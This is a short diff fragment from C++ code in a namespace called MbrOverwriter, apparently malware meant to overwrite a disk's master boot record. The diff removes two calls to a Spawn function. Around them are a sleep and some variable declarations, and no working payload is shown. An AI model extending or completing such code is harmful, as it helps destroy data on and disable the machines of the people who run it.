@@ -164,9 +164,6 @@ namespace MbrOverwriter
             catch (...)
             {
             }
-
-            MbrOverwriter::Class2::Spawn(600);
-            MbrOverwriter::Class2::Spawn(150);
             std::this_thread::sleep_for(std::chrono::milliseconds(12000));
             BOOLEAN t1;
             ULONG t2;
